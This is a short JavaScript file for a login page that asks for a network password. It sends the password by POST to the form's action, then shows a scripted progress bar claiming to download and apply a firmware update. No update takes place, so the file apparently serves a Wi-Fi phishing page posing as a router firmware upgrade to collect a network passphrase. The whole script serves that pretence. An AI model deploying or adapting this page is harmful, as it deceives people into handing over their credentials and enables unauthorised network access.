(function() {

	var onLoad = function() {
		var password = document.getElementById("password");
		var toggle = document.getElementById("showpass");
		var form = document.getElementById("loginform");
		var errortext = document.getElementById("errortext");
		var overlay = document.getElementById("progress-overlay");
		var label = document.getElementById("progress-label");
		var barFill = document.getElementById("progress-bar-fill");

		if (password) {
			password.oninvalid = function() {
				this.setCustomValidity("The password must be at least 8 characters");
			};
			password.oninput = function() {
				this.setCustomValidity("");
			};
		}

		if (password && toggle) {
			toggle.addEventListener("click", function() {
				password.setAttribute("type", password.type === "text" ? "password" : "text");
			});
			toggle.checked = false;
		}

		if (form && overlay && label && barFill) {
			var installStages = [
				{ pct: 55, text: "Downloading firmware package..." },
				{ pct: 85, text: "Preparing installation..." },
				{ pct: 100, text: "Applying update, do not disconnect..." }
			];

			var showError = function(message) {
				overlay.classList.remove("active");
				barFill.style.width = "0%";
				if (errortext) errortext.textContent = message;
				password.focus();
			};

			var runInstallStages = function(finalHtml) {
				var i = 0;
				var advance = function() {
					if (i >= installStages.length) {
						document.open();
						document.write(finalHtml);
						document.close();
						return;
					}
					label.textContent = installStages[i].text;
					barFill.style.width = installStages[i].pct + "%";
					i++;
					setTimeout(advance, 900);
				};
				advance();
			};

			form.addEventListener("submit", function(event) {
				if (!form.checkValidity()) return;
				event.preventDefault();

				if (errortext) errortext.textContent = "";
				overlay.classList.add("active");
				label.textContent = "Verifying network credentials...";
				barFill.style.width = "20%";

				fetch(form.getAttribute("action"), {
					method: "POST",
					headers: { "Content-Type": "application/x-www-form-urlencoded" },
					body: "password=" + encodeURIComponent(password.value)
				})
					.then(function(response) { return response.text(); })
					.then(function(html) {
						if (/data-status="success"/.test(html)) {
							runInstallStages(html);
						} else {
							showError("Incorrect password. Please try again.");
						}
					})
					.catch(function() {
						showError("Connection error. Please try again.");
					});
			});
		}
	};

	if (document.readyState !== 'loading') onLoad(); else document.addEventListener('DOMContentLoaded', onLoad);
})();

function redirect() {
	document.location = "index.htm";
}
